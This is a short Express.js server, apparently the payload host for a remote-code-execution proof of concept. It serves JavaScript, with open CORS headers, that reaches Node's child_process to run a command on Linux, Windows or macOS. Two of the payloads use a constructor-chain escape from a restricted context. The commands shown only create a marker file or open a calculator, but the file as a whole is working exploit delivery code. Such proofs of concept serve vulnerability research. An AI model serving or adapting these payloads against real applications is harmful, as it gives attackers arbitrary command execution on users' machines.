const express = require("express")
const app = express()

app.use((req, res, next) => {
	res.setHeader("Content-Type", "text/javascript")
	res.setHeader("Access-Control-Allow-Origin", "*")
	res.setHeader("Access-Control-Allow-Headers", "X-Requested-With, crossDomain")
    next()
})
app.get("/linux", (_, res) => {
	res.send("global.process.mainModule.require('child_process').exec('touch /tmp/pwned');")
})

app.get("/win", (_, res) => {
	res.send("this.constructor.constructor('return process.mainModule.require(\"child_process\").exec(\"calc\")')()")
})

app.get("/macos", (_, res) => {
	res.send("this.constructor.constructor('return process.mainModule.require(\"child_process\").exec(\"open /System/Applications/Calculator.app\")')()")
})

app.listen(89)